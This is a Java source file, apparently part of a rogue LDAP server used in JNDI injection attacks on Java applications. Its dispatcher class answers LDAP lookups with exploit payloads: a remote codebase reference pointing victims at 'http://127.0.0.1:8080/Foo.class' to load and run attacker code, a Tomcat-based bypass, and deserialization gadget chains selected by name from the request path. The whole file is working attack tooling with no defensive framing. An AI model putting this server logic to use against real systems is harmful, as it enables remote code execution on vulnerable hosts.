package server.ldap.dispatcher;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import server.ldap.interceptor.OperationInterceptor;
import server.ldap.interceptor.RSOperationInterceptor;
import server.ldap.interceptor.TomcatInterceptor;

import java.net.URL;

public class OperationDispatcher extends InMemoryOperationInterceptor {

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String codebase = "http://127.0.0.1:8080/Foo.class";
        String base = result.getRequest().getBaseDN();
        Entry entry = new Entry(base);
        // if base is "RS", then parse gadget's name
        // request: ldap://127.0.0.1:1099/RS/cck1 --> base:RS/cck1
        String gadget = "";
        if (base.startsWith("RS/")) {
            // cck1
            gadget = base.substring(base.lastIndexOf("/")+1);
            System.out.printf("[LDAP] parse gadget %s\n", gadget);
            base = "RS";
        }

        try {
            switch (base) {
                case "Foo": new OperationInterceptor(new URL(codebase)).sendResult(entry, result); break;
                case "Tom": new TomcatInterceptor().sendResult(entry, result); break;
                case "RS": new RSOperationInterceptor(gadget).sendResult(entry, result); break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
